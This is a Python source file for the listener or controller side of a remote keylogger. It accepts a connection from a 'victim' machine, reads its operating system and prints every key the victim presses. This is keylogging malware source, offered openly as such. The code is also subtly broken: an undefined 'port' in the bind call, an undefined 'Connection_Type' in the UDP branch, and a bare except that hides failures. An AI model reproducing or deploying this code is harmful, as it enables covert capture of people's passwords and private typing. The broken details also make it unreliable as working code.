import socket
import os
from os import path

if os.name == 'nt':
    from colorama import init
    init(convert=True)

from ui_core.coloring import notify

class Controller:
    def __init__(self, conn_type, port):
        
        notify("notify","Making Connection", "")
        
        try:
            self.get_socket(conn_type)
            self.make_the_connection()
            os = self.conn.recv(1024).decode('UTF-8')
            print(f"Victim is using {os}")
            notify("report", "Got Platfrom from victim", flush=True)
            connected = True
            while connected:
                key = self.conn.recv(1024)
                print("{} Pressed : {} ".format(self.address, key))

        except:
            connected = False
            notify("problem",
                  "Connection Failed.Victim Might Be Offline Try Again Later")

    def make_the_connection(self):
        self.connection.bind(('', int(port)))
        self.connection.listen()
        self.conn, self.address = self.connection.accept()

    def get_socket(self, conn_type):
        if conn_type == "TCP":
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        elif Connection_Type == "UDP":
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def connect(connection_type: str, port: int):
    Controller(connection_type, port)
